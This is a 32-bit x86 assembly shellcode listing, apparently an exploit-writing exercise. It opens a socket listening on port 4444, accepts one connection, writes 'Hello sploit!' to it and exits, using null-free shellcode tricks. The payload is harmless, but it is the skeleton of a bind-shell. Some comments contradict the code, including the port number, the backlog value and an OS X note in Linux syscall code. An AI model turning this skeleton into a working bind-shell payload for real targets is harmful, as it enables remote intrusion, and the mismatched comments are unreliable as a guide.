;BITS 32

; s = socket(2,1,0)
  xor eax, eax
  mov al, 0x66
  cdq               ; Zero out edx for use as a null DWORD
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0
  push 0x1          ; (in reverse)       SOCK_STREAM = 1,
  push 0x2          ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall eax has socket file descriptor

  mov esi, eax      ; save socket FD in esi for later

; bind(s, [2,31337, 0], 16)
  xor eax, eax
  mov al, 0x66
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  mov dx, 0x5c11
  push dx           ;                         PORT = 4444
  push bx           ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov al, 0x66      ; socketcall (syscall #102)
  inc ebx           ;
  inc ebx           ; ebx = 4 = SYS_LISTEN listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov al, 0x66      ; socketcall (syscall #102)
  cdq
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD

; say something on sock
mov ebx, eax    ; ebx will hold fd for next syscall, write()
jmp bounceback  ; jump to end

landing:
  ; ssize_t write(int fd, const void *buf, size_t count);
  xor edx, edx
  mov dl, 14    ; length of string
  pop ecx       ; pop the ret addr which is actually our string addr into ecx
  xor eax,eax   ; zero out eax
  mov al, 4     ; put write syscall # in al
  sub esp, 4    ; OS X (and BSD) system calls need extra space on stack
  int 0x80

  ; exit(0)
  xor eax,eax   ; zero out ebx
  push eax      ; push exit code of zero onto stack
  mov al, 1     ; put exit syscall # in al
  int 0x80

bounceback:
  call landing     ; call backwards, to a call address with no nulls
  msg db "Hello sploit!", 0x0a, 0x0d


